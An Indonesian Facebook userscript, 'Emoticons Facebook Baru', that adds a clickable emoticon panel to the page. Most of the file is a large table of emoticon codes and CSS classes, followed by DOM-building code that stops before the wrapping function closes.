// ==UserScript==
// @name    	Emoticons Facebook Baru
// @namespace	Emoticons Facebook untuk Status, Chat dan Komentar
// @description	Emoticons Facebook 2013
// @version 	1337
// @author  	Muallif Ramones
// @authorURL	www.facebook.com/muallif.98
// @include 	http://www.facebook.com/*
// @include 	https://www.facebook.com/*
// ==/UserScript==
(function () {

    if (!document.querySelector("#pageNav")) {
        return;
    }
    //console.info("Extra Facebook Smileys");

    // = Data =======
    var emoticons = [{ // Text to picture emoticons
        "chars": " :) ",
        "class": "emoticon_smile",
        "name": "senyum"
    }, {
        "chars": " :( ",
        "class": "emoticon_frown",
        "name": "mengkerut"
    }, {
        "chars": " :P ",
        "class": "emoticon_tongue",
        "name": "meng-umpat"
    }, {
        "chars": " :D ",
        "class": "emoticon_grin",
        "name": "senyum lebar"
    }, {
        "chars": " :o ",
        "class": "emoticon_gasp",
        "name": "melenguh"
    }, {
        "chars": " ;) ",
        "class": "emoticon_wink",
        "name": "berkedip"
    }, {
        "chars": " :v ",
        "class": "emoticon_pacman",
        "name": "tertawa"
    }, {
        "chars": " >:( ",
        "class": "emoticon_grumpy",
        "name": "pemarah"
    }, {
        "chars": " :/ ",
        "class": "emoticon_unsure",
        "name": "tidak yakin"
    }, {
        "chars": " :'( ",
        "class": "emoticon_cry",
        "name": "menangis"
    }, {
        "chars": " ^_^ ",
        "class": "emoticon_kiki",
        "name": "mata sipit"
    }, {
        "chars": " 8) ",
        "class": "emoticon_glasses",
        "name": "kacamata"
    }, {
        "chars": " B| ",
        "class": "emoticon_sunglasses",
        "name": "kacamata hitam"
    }, {
        "chars": " <3 ",
        "class": "emoticon_heart",
        "name": "hati"
    }, {
        "chars": " 3:) ",
        "class": "emoticon_devil",
        "name": "setan"
    }, {
        "chars": " O:) ",
        "class": "emoticon_angel",
        "name": "malaikat"
    }, {
        "chars": " -_- ",
        "class": "emoticon_squint",
        "name": "menyipitkan"
    }, {
        "chars": " o.O ",
        "class": "emoticon_confused",
        "name": "bingung"
    }, {
        "chars": " >:o ",
        "class": "emoticon_upset",
        "name": "bingung"
    }, {
        "chars": " :3 ",
        "class": "emoticon_colonthree",
        "name": "bau"
    }, {
        "chars": " (y) ",
        "class": "emoticon_like",
        "name": "suka"
    }, {
        "chars": " :* ",
        "class": "emoticon emoticon_kiss",
        "name": "cipok"
    }, {
        "chars": " (^^^) ",
        "class": "emoticon_shark",
        "name": "hiu"
    }, {
        "chars": " :|] ",
        "class": "emoticon_robot",
        "name": "Robot"
    }, {
        "chars": " <(\") ",
        "class": "emoticon_penguin",
        "name": "Pinguin"
    }, {
        "chars": " :poop: ",
        "class": "emoticon_poop",
        "name": "TAEK"
    }, {
        "chars": " :putnam: ",
        "class": "emoticon_putnam",
        "name": "Putman"
    }, {
        "chars": " \ud83c\udf02 ",
        "class": "_1az _1a- _2c0",
        "name": "Payung Pink"
    }, {
        "chars": " \ud83c\udf0a ",
        "class": "_1az _1a- _2c1",
        "name": "Ombak Laut"
    }, {
        "chars": " \ud83c\udf19 ",
        "class": "_1az _1a- _2c2",
        "name": "Bulan Sabit"
    }, {
        "chars": " \ud83c\udf1f ",
        "class": "_1az _1a- _2c3",
        "name": "Bintang Terang"
    }, {
        "chars": " \ud83c\udf31 ",
        "class": "_1az _1a- _2c4",
        "name": "Persemaian"
    }, {
        "chars": " \ud83c\udf34 ",
        "class": "_1az _1a- _2c5",
        "name": "Palm"
    }, {
        "chars": " \ud83c\udf35 ",
        "class": "_1az _1a- _2c6",
        "name": "Kaktus"
    }, {
        "chars": " \ud83c\udf37 ",
        "class": "_1az _1a- _2c7",
        "name": "Tulip"
    }, {
        "chars": " \ud83c\udf38 ",
        "class": "_1az _1a- _2c8",
        "name": "Cherry Blossom"
    }, {
        "chars": " \ud83c\udf39 ",
        "class": "_1az _1a- _2c9",
        "name": "Rose"
    }, {
        "chars": " \ud83c\udf3a ",
        "class": "_1az _1a- _2ca",
        "name": "Cayenne"
    }, {
        "chars": " \ud83c\udf3b ",
        "class": "_1az _1a- _2cb",
        "name": "Sunflower"
    }, {
        "chars": " \ud83c\udf3e ",
        "class": "_1az _1a- _2cc",
        "name": "Ear Of Rice"
    }, {
        "chars": " \ud83c\udf40 ",
        "class": "_1az _1a- _2cd",
        "name": "Four Leaf Clover"
    }, {
        "chars": " \ud83c\udf41 ",
        "class": "_1az _1a- _2ce",
        "name": "Maple Leaf"
    }, {
        "chars": " \ud83c\udf42 ",
        "class": "_1az _1a- _2cf",
        "name": "Fallen Leaf"
    }, {
        "chars": " \ud83c\udf43 ",
        "class": "_1az _1a- _2cg",
        "name": "Leaf Floating In The Wind"
    }, {
        "chars": " \ud83c\udf4a ",
        "class": "_1az _1a- _2ch",
        "name": "Tangerine"
    }, {
        "chars": " \ud83c\udf4e ",
        "class": "_1az _1a- _2ci",
        "name": "Red Apple"
    }, {
        "chars": " \ud83c\udf53 ",
        "class": "_1az _1a- _2cj",
        "name": "Strawberry"
    }, {
        "chars": " \ud83c\udf54 ",
        "class": "_1az _1a- _2ck",
        "name": "Burger"
    }, {
        "chars": " \ud83c\udf78 ",
        "class": "_1az _1a- _2cl",
        "name": "Cocktail Glass"
    }, {
        "chars": " \ud83c\udf7a ",
        "class": "_1az _1a- _2cm",
        "name": "Tankard"
    }, {
        "chars": " \ud83c\udf81 ",
        "class": "_1az _1a- _2cn",
        "name": "Gift Wrapped"
    }, {
        "chars": " \ud83c\udf83 ",
        "class": "_1az _1a- _2co",
        "name": "Pumpkin With Candle"
    }, {
        "chars": " \ud83c\udf84 ",
        "class": "_1az _1a- _2cp",
        "name": "Christmas Tree"
    }, {
        "chars": " \ud83c\udf85 ",
        "class": "_1az _1a- _2cq",
        "name": "Santa"
    }, {
        "chars": " \ud83c\udf88 ",
        "class": "_1az _1a- _2cr",
        "name": "Balloon"
    }, {
        "chars": " \ud83c\udf89 ",
        "class": "_1az _1a- _2cs",
        "name": "Party Popper"
    }, {
        "chars": " \ud83c\udf8d ",
        "class": "_1az _1a- _2ct",
        "name": "Pine Decor"
    }, {
        "chars": " \ud83c\udf8e ",
        "class": "_1az _1a- _2cu",
        "name": "Japanese Dolls"
    }, {
        "chars": " \ud83c\udf8f ",
        "class": "_1az _1a- _2cv",
        "name": "Carp Streamer"
    }, {
        "chars": " \ud83c\udf90 ",
        "class": "_1az _1a- _2cw",
        "name": "Wind Chime"
    }, {
        "chars": " \ud83c\udf93 ",
        "class": "_1az _1a- _2cx",
        "name": "Graduation Cap"
    }, {
        "chars": " \ud83c\udfb5 ",
        "class": "_1az _1a- _2cy",
        "name": "Musical Note"
    }, {
        "chars": " \ud83c\udfb6 ",
        "class": "_1az _1a- _2cz",
        "name": "Multiple Musical Notes"
    }, {
        "chars": " \ud83c\udfbc ",
        "class": "_1az _1a- _2c-",
        "name": "Musical Score"
    }, {
        "chars": " \ud83d\udc0d ",
        "class": "_1az _1a- _2c_",
        "name": "Snake"
    }, {
        "chars": " \ud83d\udc0e ",
        "class": "_1az _1a- _2d0",
        "name": "Horse"
    }, {
        "chars": " \ud83d\udc11 ",
        "class": "_1az _1a- _2d1",
        "name": "Sheep"
    }, {
        "chars": " \ud83d\udc12 ",
        "class": "_1az _1a- _2d2",
        "name": "Monkey"
    }, {
        "chars": " \ud83d\udc14 ",
        "class": "_1az _1a- _2d3",
        "name": "Hen"
    }, {
        "chars": " \ud83d\udc17 ",
        "class": "_1az _1a- _2d4",
        "name": "Wild Boar"
    }, {
        "chars": " \ud83d\udc18 ",
        "class": "_1az _1a- _2d5",
        "name": "Elephant"
    }, {
        "chars": " \ud83d\udc19 ",
        "class": "_1az _1a- _2d6",
        "name": "Octopus"
    }, {
        "chars": " \ud83d\udc1a ",
        "class": "_1az _1a- _2d7",
        "name": "Snail Shell"
    }, {
        "chars": " \ud83d\udc1b ",
        "class": "_1az _1a- _2d8",
        "name": "Insect"
    }, {
        "chars": " \ud83d\udc1f ",
        "class": "_1az _1a- _2d9",
        "name": "Fish"
    }, {
        "chars": " \ud83d\udc20 ",
        "class": "_1az _1a- _2da",
        "name": "Tropical Fish"
    }, {
        "chars": " \ud83d\udc21 ",
        "class": "_1az _1a- _2db",
        "name": "Pufferfish"
    }, {
        "chars": " \ud83d\udc25 ",
        "class": "_1az _1a- _2dc",
        "name": "Chick In Front"
    }, {
        "chars": " \ud83d\udc26 ",
        "class": "_1az _1a- _2dd",
        "name": "Bird"
    }, {
        "chars": " \ud83d\udc27 ",
        "class": "_1az _1a- _2de",
        "name": "Penguin"
    }, {
        "chars": " \ud83d\udc28 ",
        "class": "_1az _1a- _2df",
        "name": "Koala"
    }, {
        "chars": " \ud83d\udc29 ",
        "class": "_1az _1a- _2dg",
        "name": "Poodle"
    }, {
        "chars": " \ud83d\udc2b ",
        "class": "_1az _1a- _2dh",
        "name": "Bactrian Camel"
    }, {
        "chars": " \ud83d\udc2c ",
        "class": "_1az _1a- _2di",
        "name": "Dolphin"
    }, {
        "chars": " \ud83d\udc2d ",
        "class": "_1az _1a- _2dj",
        "name": "Mouse Face"
    }, {
        "chars": " \ud83d\udc2e ",
        "class": "_1az _1a- _2dk",
        "name": "Cow Face"
    }, {
        "chars": " \ud83d\udc2f ",
        "class": "_1az _1a- _2dl",
        "name": "Cara de tigre"
    }, {
        "chars": " \ud83d\udc30 ",
        "class": "_1az _1a- _2dm",
        "name": "Rabbit Face"
    }, {
        "chars": " \ud83d\udc31 ",
        "class": "_1az _1a- _2dn",
        "name": "Cat Face"
    }, {
        "chars": " \ud83d\udc33 ",
        "class": "_1az _1a- _2do",
        "name": "Whale Sputtering"
    }, {
        "chars": " \ud83d\udc34 ",
        "class": "_1az _1a- _2dp",
        "name": "Horse Face"
    }, {
        "chars": " \ud83d\udc35 ",
        "class": "_1az _1a- _2dq",
        "name": "Monkey Face"
    }, {
        "chars": " \ud83d\udc37 ",
        "class": "_1az _1a- _2dr",
        "name": "Pig face"
    }, {
        "chars": " \ud83d\udc38 ",
        "class": "_1az _1a- _2ds",
        "name": "Frog Face"
    }, {
        "chars": " \ud83d\udc39 ",
        "class": "_1az _1a- _2dt",
        "name": "Hamster Face"
    }, {
        "chars": " \ud83d\udc3a ",
        "class": "_1az _1a- _2du",
        "name": "Wolf Face"
    }, {
        "chars": " \ud83d\udc3b ",
        "class": "_1az _1a- _2dv",
        "name": "Bear Face"
    }, {
        "chars": " \ud83d\udc3e ",
        "class": "_1az _1a- _2dw",
        "name": "Footprints"
    }, {
        "chars": " \ud83d\udc40 ",
        "class": "_1az _1a- _2dx",
        "name": "Eyes"
    }, {
        "chars": " \ud83d\udc42 ",
        "class": "_1az _1a- _2dy",
        "name": "Ear"
    }, {
        "chars": " \ud83d\udc43 ",
        "class": "_1az _1a- _2dz",
        "name": "Nose"
    }, {
        "chars": " \ud83d\udc44 ",
        "class": "_1az _1a- _2d-",
        "name": "Mouth"
    }, {
        "chars": " \ud83d\udc45 ",
        "class": "_1az _1a- _2d_",
        "name": "Sour Face"
    }, {
        "chars": " \ud83d\udc46 ",
        "class": "_1az _1a- _2e0",
        "name": "White hand pointing up"
    }, {
        "chars": " \ud83d\udc47 ",
        "class": "_1az _1a- _2e1",
        "name": "White hand faces downward"
    }, {
        "chars": " \ud83d\udc48 ",
        "class": "_1az _1a- _2e2",
        "name": "White hand indicating left"
    }, {
        "chars": " \ud83d\udc49 ",
        "class": "_1az _1a- _2e3",
        "name": "White hand indicating right"
    }, {
        "chars": " \ud83d\udc4a ",
        "class": "_1az _1a- _2e4",
        "name": "Fist"
    }, {
        "chars": " \ud83d\udc4b ",
        "class": "_1az _1a- _2e5",
        "name": "Hand in motion"
    }, {
        "chars": " \ud83d\udc4c ",
        "class": "_1az _1a- _2e6",
        "name": "Hand showing all good"
    }, {
        "chars": " \ud83d\udc4d ",
        "class": "_1az _1a- _2e7",
        "name": "Hand with thumb up"
    }, {
        "chars": " \ud83d\udc4e ",
        "class": "_1az _1a- _2e8",
        "name": "Hand with thumb down"
    }, {
        "chars": " \ud83d\udc4f ",
        "class": "_1az _1a- _2e9",
        "name": "Hands clapping"
    }, {
        "chars": " \ud83d\udc50 ",
        "class": "_1az _1a- _2ea",
        "name": "Open Hands"
    }, {
        "chars": " \ud83d\udc66 ",
        "class": "_1az _1a- _2eb",
        "name": "Boy"
    }, {
        "chars": " \ud83d\udc67 ",
        "class": "_1az _1a- _2ec",
        "name": "Girl"
    }, {
        "chars": " \ud83d\udc68 ",
        "class": "_1az _1a- _2ed",
        "name": "Man"
    }, {
        "chars": " \ud83d\udc69 ",
        "class": "_1az _1a- _2ee",
        "name": "Woman"
    }, {
        "chars": " \ud83d\udc6b ",
        "class": "_1az _1a- _2ef",
        "name": "Man and woman holding hands"
    }, {
        "chars": " \ud83d\udc6e ",
        "class": "_1az _1a- _2eg",
        "name": "Police Officer"
    }, {
        "chars": " \ud83d\udc6f ",
        "class": "_1az _1a- _2eh",
        "name": "Woman with bunny ears"
    }, {
        "chars": " \ud83d\udc71 ",
        "class": "_1az _1a- _2ei",
        "name": "Person with hair rubio"
    }, {
        "chars": " \ud83d\udc72 ",
        "class": "_1az _1a- _2ej",
        "name": "Man with pi mao gua"
    }, {
        "chars": " \ud83d\udc73 ",
        "class": "_1az _1a- _2ek",
        "name": "Man with turban"
    }, {
        "chars": " \ud83d\udc74 ",
        "class": "_1az _1a- _2el",
        "name": "Old Man"
    }, {
        "chars": " \ud83d\udc75 ",
        "class": "_1az _1a- _2em",
        "name": "Old Woman"
    }, {
        "chars": " \ud83d\udc76 ",
        "class": "_1az _1a- _2en",
        "name": "Baby"
    }, {
        "chars": " \ud83d\udc77 ",
        "class": "_1az _1a- _2eo",
        "name": "Construction Worker"
    }, {
        "chars": " \ud83d\udc78 ",
        "class": "_1az _1a- _2ep",
        "name": "Princess"
    }, {
        "chars": " \ud83d\udc7b ",
        "class": "_1az _1a- _2eq",
        "name": "Ghost"
    }, {
        "chars": " \ud83d\udc7c ",
        "class": "_1az _1a- _2er",
        "name": "Angel baby"
    }, {
        "chars": " \ud83d\udc7d ",
        "class": "_1az _1a- _2es",
        "name": "Alien"
    }, {
        "chars": " \ud83d\udc7e ",
        "class": "_1az _1a- _2et",
        "name": "Alien Monster"
    }, {
        "chars": " \ud83d\udc7f ",
        "class": "_1az _1a- _2eu",
        "name": "Imp"
    }, {
        "chars": " \ud83d\udc80 ",
        "class": "_1az _1a- _2ev",
        "name": "Skull"
    }, {
        "chars": " \ud83d\udc82 ",
        "class": "_1az _1a- _2ew",
        "name": "Guard"
    }, {
        "chars": " \ud83d\udc83 ",
        "class": "_1az _1a- _2ex",
        "name": "Ballerina"
    }, {
        "chars": " \ud83d\udc85 ",
        "class": "_1az _1a- _2ey",
        "name": "Nail Polish"
    }, {
        "chars": " \ud83d\udc8b ",
        "class": "_1az _1a- _2ez",
        "name": "Brand of kiss"
    }, {
        "chars": " \ud83d\udc8f ",
        "class": "_1az _1a- _2e-",
        "name": "Kissing couple"
    }, {
        "chars": " \ud83d\udc90 ",
        "class": "_1az _1a- _2e_",
        "name": "Bunch of flowers"
    }, {
        "chars": " \ud83d\udc91 ",
        "class": "_1az _1a- _2f0",
        "name": "Couple with heart"
    }, {
        "chars": " \ud83d\udc93 ",
        "class": "_1az _1a- _2f1",
        "name": "Heart beating"
    }, {
        "chars": " \ud83d\udc94 ",
        "class": "_1az _1a- _2f2",
        "name": "Broken Heart"
    }, {
        "chars": " \ud83d\udc96 ",
        "class": "_1az _1a- _2f3",
        "name": "Bright Heart"
    }, {
        "chars": " \ud83d\udc97 ",
        "class": "_1az _1a- _2f4",
        "name": "Heart growing"
    }, {
        "chars": " \ud83d\udc98 ",
        "class": "_1az _1a- _2f5",
        "name": "Heart with arrow"
    }, {
        "chars": " \ud83d\udc99 ",
        "class": "_1az _1a- _2f6",
        "name": "Blue Heart"
    }, {
        "chars": " \ud83d\udc9a ",
        "class": "_1az _1a- _2f7",
        "name": "Green Heart"
    }, {
        "chars": " \ud83d\udc9b ",
        "class": "_1az _1a- _2f8",
        "name": "Yellow Heart"
    }, {
        "chars": " \ud83d\udc9c ",
        "class": "_1az _1a- _2f9",
        "name": "Purple Heart"
    }, {
        "chars": " \ud83d\udc9d ",
        "class": "_1az _1a- _2fa",
        "name": "Heart with ribbon"
    }, {
        "chars": " \ud83d\udca2 ",
        "class": "_1az _1a- _2fb",
        "name": "Symbol of anger"
    }, {
        "chars": " \ud83d\udca4 ",
        "class": "_1az _1a- _2fc",
        "name": "Sleeping"
    }, {
        "chars": " \ud83d\udca6 ",
        "class": "_1az _1a- _2fd",
        "name": "Sweat Symbol"
    }, {
        "chars": " \ud83d\udca8 ",
        "class": "_1az _1a- _2fe",
        "name": "Quick Start Symbol"
    }, {
        "chars": " \ud83d\udca9 ",
        "class": "_1az _1a- _2ff",
        "name": "Pile of Caca"
    }, {
        "chars": " \ud83d\udcaa ",
        "class": "_1az _1a- _2fg",
        "name": "Flexed bicep"
    }, {
        "chars": " \ud83d\udcbb ",
        "class": "_1az _1a- _2fh",
        "name": "Personal Computer"
    }, {
        "chars": " \ud83d\udcbd ",
        "class": "_1az _1a- _2fi",
        "name": "Mini Disco"
    }, {
        "chars": " \ud83d\udcbe ",
        "class": "_1az _1a- _2fj",
        "name": "Floppy disk"
    }, {
        "chars": " \ud83d\udcbf ",
        "class": "_1az _1a- _2fk",
        "name": "Optical Disc"
    }, {
        "chars": " \ud83d\udcc0 ",
        "class": "_1az _1a- _2fl",
        "name": "DVD"
    }, {
        "chars": " \ud83d\udcde ",
        "class": "_1az _1a- _2fm",
        "name": "Telephone receiver"
    }, {
        "chars": " \ud83d\udce0 ",
        "class": "_1az _1a- _2fn",
        "name": "Fax"
    }, {
        "chars": " \ud83d\udcf1 ",
        "class": "_1az _1a- _2fo",
        "name": "Mobile Phone"
    }, {
        "chars": " \ud83d\udcf2 ",
        "class": "_1az _1a- _2fp",
        "name": "Mobile phone with arrow from left to right"
    }, {
        "chars": " \ud83d\udcfa ",
        "class": "_1az _1a- _2fq",
        "name": "Television"
    }, {
        "chars": " \ud83d\udd14 ",
        "class": "_1az _1a- _2fr",
        "name": "Bell"
    }, {
        "chars": " \ud83d\ude01 ",
        "class": "_1az _1a- _2fs",
        "name": "Face to face with smiling eyes"
    }, {
        "chars": " \ud83d\ude02 ",
        "class": "_1az _1a- _2ft",
        "name": "Face with tears of joy"
    }, {
        "chars": " \ud83d\ude03 ",
        "class": "_1az _1a- _2fu",
        "name": "Smiley face with open mouth"
    }, {
        "chars": " \ud83d\ude04 ",
        "class": "_1az _1a- _2fv",
        "name": "Face and eyes smiling with mouth open"
    }, {
        "chars": " \ud83d\ude06 ",
        "class": "_1az _1a- _2fw",
        "name": "Smiley face with mouth open and eyes closed"
    }, {
        "chars": " \ud83d\ude09 ",
        "class": "_1az _1a- _2fx",
        "name": "Face winking eye"
    }, {
        "chars": " \ud83d\ude0b ",
        "class": "_1az _1a- _2fy",
        "name": "Guy savoring delicious food"
    }, {
        "chars": " \ud83d\ude0c ",
        "class": "_1az _1a- _2fz",
        "name": "Relief face"
    }, {
        "chars": " \ud83d\ude0d ",
        "class": "_1az _1a- _2f-",
        "name": "Smiley face with heart shaped eyes"
    }, {
        "chars": " \ud83d\ude0f ",
        "class": "_1az _1a- _2f_",
        "name": "Smirk face"
    }, {
        "chars": " \ud83d\ude12 ",
        "class": "_1az _1a- _2g0",
        "name": "Face of boredom"
    }, {
        "chars": " \ud83d\ude13 ",
        "class": "_1az _1a- _2g1",
        "name": "Face with cold sweat"
    }, {
        "chars": " \ud83d\ude14 ",
        "class": "_1az _1a- _2g2",
        "name": "Pensive face"
    }, {
        "chars": " \ud83d\ude16 ",
        "class": "_1az _1a- _2g3",
        "name": "Confused face"
    }, {
        "chars": " \ud83d\ude18 ",
        "class": "_1az _1a- _2g4",
        "name": "Throwing kiss Face"
    }, {
        "chars": " \ud83d\ude1a ",
        "class": "_1az _1a- _2g5",
        "name": "Kissing face with eyes closed"
    }, {
        "chars": " \ud83d\ude1c ",
        "class": "_1az _1a- _2g6",
        "name": "Face with tongue out and winking"
    }, {
        "chars": " \ud83d\ude1d ",
        "class": "_1az _1a- _2g7",
        "name": "Face with tongue hanging out and eyes closed"
    }, {
        "chars": " \ud83d\ude1e ",
        "class": "_1az _1a- _2g8",
        "name": "Face discouraged"
    }, {
        "chars": " \ud83d\ude20 ",
        "class": "_1az _1a- _2g9",
        "name": "Face of anger"
    }, {
        "chars": " \ud83d\ude21 ",
        "class": "_1az _1a- _2ga",
        "name": "Very angry face"
    }, {
        "chars": " \ud83d\ude22 ",
        "class": "_1az _1a- _2gb",
        "name": "Crying Face"
    }, {
        "chars": " \ud83d\ude23 ",
        "class": "_1az _1a- _2gc",
        "name": "Face of perseverance"
    }, {
        "chars": " \ud83d\ude24 ",
        "class": "_1az _1a- _2gd",
        "name": "Face of triumph"
    }, {
        "chars": " \ud83d\ude25 ",
        "class": "_1az _1a- _2ge",
        "name": "Face discouraged but relieved"
    }, {
        "chars": " \ud83d\ude28 ",
        "class": "_1az _1a- _2gf",
        "name": "Scary face"
    }, {
        "chars": " \ud83d\ude29 ",
        "class": "_1az _1a- _2gg",
        "name": "Fatigued face"
    }, {
        "chars": " \ud83d\ude2a ",
        "class": "_1az _1a- _2gh",
        "name": "Sleeping face"
    }, {
        "chars": " \ud83d\ude2b ",
        "class": "_1az _1a- _2gi",
        "name": "Tired face"
    }, {
        "chars": " \ud83d\ude2d ",
        "class": "_1az _1a- _2gj",
        "name": "Face screaming"
    }, {
        "chars": " \ud83d\ude30 ",
        "class": "_1az _1a- _2gk",
        "name": "Face with mouth open and cold sweat"
    }, {
        "chars": " \ud83d\ude31 ",
        "class": "_1az _1a- _2gl",
        "name": "Terrified face of fear"
    }, {
        "chars": " \ud83d\ude32 ",
        "class": "_1az _1a- _2gm",
        "name": "Very surprised face"
    }, {
        "chars": " \ud83d\ude33 ",
        "class": "_1az _1a- _2gn",
        "name": "Face flushed"
    }, {
        "chars": " \ud83d\ude35 ",
        "class": "_1az _1a- _2go",
        "name": "Face dizzy"
    }, {
        "chars": " \ud83d\ude37 ",
        "class": "_1az _1a- _2gp",
        "name": "Face with medical mask"
    }, {
        "chars": " \ud83d\ude38 ",
        "class": "_1az _1a- _2gq",
        "name": "Grinning Cat face and eyes closed"
    }, {
        "chars": " \ud83d\ude39 ",
        "class": "_1az _1a- _2gr",
        "name": "Cat face with tears of laughter"
    }, {
        "chars": " \ud83d\ude3a ",
        "class": "_1az _1a- _2gs",
        "name": "Smiling cat face with open mouth"
    }, {
        "chars": " \ud83d\ude3b ",
        "class": "_1az _1a- _2gt",
        "name": "Smiling cat face with hearts in her eyes"
    }, {
        "chars": " \ud83d\ude3c ",
        "class": "_1az _1a- _2gu",
        "name": "Face of cat smile twisted"
    }, {
        "chars": " \ud83d\ude3d ",
        "class": "_1az _1a- _2gv",
        "name": "Cat face kissing with eyes closed"
    }, {
        "chars": " \ud83d\ude3f ",
        "class": "_1az _1a- _2gw",
        "name": "Cat face crying"
    }, {
        "chars": " \ud83d\ude40 ",
        "class": "_1az _1a- _2gx",
        "name": "Cat face scared terrified"
    }, {
        "chars": " \ud83d\ude4b ",
        "class": "_1az _1a- _2gy",
        "name": "Happy person raising a hand"
    }, {
        "chars": " \ud83d\ude4c ",
        "class": "_1az _1a- _2gz",
        "name": "Person holding up both hands in celebration"
    }, {
        "chars": " \ud83d\ude4d ",
        "class": "_1az _1a- _2g-",
        "name": "Person frowning"
    }, {
        "chars": " \ud83d\ude4f ",
        "class": "_1az _1a- _2g_",
        "name": "Person in prayer"
    }, {
        "chars": " \u261d ",
        "class": "_1az _1a- _2h0",
        "name": "Index finger pointing up"
    }, {
        "chars": " \u263a ",
        "class": "_1az _1a- _2h1",
        "name": "White face smiling"
    }, {
        "chars": " \u26a1 ",
        "class": "_1az _1a- _2h2",
        "name": "High voltage symbol"
    }, {
        "chars": " \u26c4 ",
        "class": "_1az _1a- _2h3",
        "name": "Snowless snowman"
    }, {
        "chars": " \u270a ",
        "class": "_1az _1a- _2h4",
        "name": "Fist up"
    }, {
        "chars": " \u270b ",
        "class": "_1az _1a- _2h5",
        "name": "Hand pointing up"
    }, {
        "chars": " \u270c ",
        "class": "_1az _1a- _2h6",
        "name": "Winning Hand"
    }, {
        "chars": " \u2600 ",
        "class": "_1az _1a- _2h7",
        "name": "Sun With Rays"
    }, {
        "chars": " \u2601 ",
        "class": "_1az _1a- _2h8",
        "name": "Cloud"
    }, {
        "chars": " \u2614 ",
        "class": "_1az _1a- _2h9",
        "name": "Umbrella With Rain Drops"
    }, {
        "chars": " \u2615 ",
        "class": "_1az _1a- _2ha",
        "name": "Kopi"
    }, {
        "chars": " \u2728 ",
        "class": "_1az _1a- _2hb",
        "name": "Brightness"
    }, {
        "chars": " \u2764 ",
        "class": "_1az _1a- _2hc",
        "name": "Heavy Black Heart"
    }, {
        "chars": " \ud83d\udc43 ",
        "class": "_1az _1a- _2dz",
        "name": "JANCUK"


    }];

    // = Variables =======
    var lastActiveElement = document.activeElement;

    // = Functions =======

    function createElement(html) {
        var outerHTML = document.createElement("div");
        outerHTML.innerHTML = html;
        return outerHTML.firstChild;
    }

    function htmlSpecialChars(string) {
        var div = document.createElement("div");
        var text = document.createTextNode(string);
        div.appendChild(text);
        return div.innerHTML;
    }

    function isInstanceOfTextInput(element) {
        return (element instanceof HTMLInputElement && element.type == "text") || element instanceof HTMLTextAreaElement;
    }

    function isFlyoutOpen(flyout) {
        return flyout.className == "openToggler";
    }

    function openFlyout(flyout, open) {
        if (open === undefined) {
            open = !isFlyoutOpen(flyout); // Toggle
        }

        if (open) {
            flyout.className = "openToggler";
        } else {
            flyout.removeAttribute("class");
        }
    }

    function createTab(titleContainer, bodyContainer) {
        var html;
        // Tab; default = inactive
        html = '<li class="jewelFlyout fbJewelFlyout uiToggleFlyout">';
        html += '<div class="jewelFlyout">';
        html += '</div>';
        html += '</li>';
        var title = createElement(html);
        titleContainer.appendChild(title);

        // Manual input
        html = '<div style="display: none;">';
        html += '</div>';
        var body = createElement(html);
        bodyContainer.appendChild(body);

        // Change tab listener
        (function (body) {
            title.addEventListener("click", function () {
                // Change tab
                var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
                for (var t = 0; t < titles.length; t++) {
                    if (titles[t] === this) { // Active

                    } else { // Inactive
                        titles[t].style.background = "";
                        titles[t].firstChild.style.color = "";
                    }
                }

                // Change body
                var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
                for (var b = 0; b < bodies.length; b++) {
                    if (bodies[b] === body) { // Show
                        body.style.display = "";
                    } else { // Hide
                        bodies[b].style.display = "none";
                    }
                }
            });
        })(body);

        return {
            "title": title.firstChild,
            "body": body
        };
    }

    function createTabListBody(emoticons, filter) {
        var html;

        html = '<div style="max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;">';
        html += '<div style="padding: 10px; width: 200px; font-size: 15px;">';
        html += '</div>';
        html += '</div>';
        var body = createElement(html).firstChild;
        for (var e = 0; e < emoticons.length; e++) {
            var emoticon = emoticons[e];
            if (!filter(emoticon)) {
                continue;
            }

            // Icons
            html = '<span class="panelCell" style="display: inline-block; vertical-align: middle; padding: 2px;">';
            html += '<a';
            html += ' class="emoticon' + (emoticon.class !== undefined ? ' ' + emoticon.class : '') + '"';
            html += ' style="text-decoration: inherit; color: inherit;' + (emoticon.class !== undefined ? ' color: transparent;' : ' width: auto;') + '"';
            html += (emoticon.name !== undefined ? ' title="' + emoticon.name + '"' : '');
            html += '>';
            html += htmlSpecialChars(emoticon.chars);
            html += '</a>';
            html += '</span>';
            var cell = createElement(html);
            body.appendChild(cell);

            // Select emoticon listener
            var emoticonA = cell.firstChild;
            (function (emoticon) {
                emoticonA.addEventListener("click", function () {
                    if (isInstanceOfTextInput(lastActiveElement)) {
                        lastActiveElement.focus();

                        var chars = emoticon.chars;
                        var value = lastActiveElement.value;
                        var start = lastActiveElement.selectionStart;
                        var end = lastActiveElement.selectionEnd;
                        lastActiveElement.value = value.substring(0, start) + chars + value.substring(end);
                        lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
                    }

                    openFlyoutCommand = false; // Close flyout
                });
            })(emoticon);
        }

        return body.parentNode;
    }

    // = Construct UI =======
    var html;

    // Menu item
    // var navItem
    html = '<li class="navItem middleItem notifNegativeBase">';
    html += '<div class="fbJewel">';
    // {

    // Toggler
    html += '<a class="navLink" title="Show Facebook Extra Emoticons">'; // var navLink
    html += '<span title="\u2615" class="_1az _1a- _2ha"></span>';
    html += '</a>';


    // Flyout
    html += '<div>'; // openToggler; var flyout
    html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
    // {


    // Beeper
    html += '<div class="jewelBeeperHeader">';
    html += '<div class="beeperNubWrapper">';
    html += '<div class="beeperNub" style="left: 4px;"></div>';
    html += '</div>';
    html += '</div>';

    // Tabs
    // var titleContainer
    html += '<ul style="display: text-align: center;">';
    html += '</ul>';

    // Bodies
    html += '<div>'; // var bodyContainer
    html += '</div>';

    // Footer
    html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/muallif.98?ref=tn_tnmn" target="_blank">Created by Muallif Ramones<br></a>';
    html += '</div>'; // thank's to Rahul

    // }
    html += '</div>'; // emoticonsPanel
    html += '</div>'; // openToggler

    // }
    html += '</div>'; // fbJewel
    html += '</li>'; // navItem

    var navItem = createElement(html);
    var pageNav = document.querySelector("#pageNav");
    pageNav.insertBefore(navItem, pageNav.firstChild);

    // Maintain active element
    navItem.addEventListener("click", function () {
        if (isInstanceOfTextInput(lastActiveElement)) {
            lastActiveElement.focus();
        }

        openFlyoutCommand = undefined; // Do nothing
    }, true);

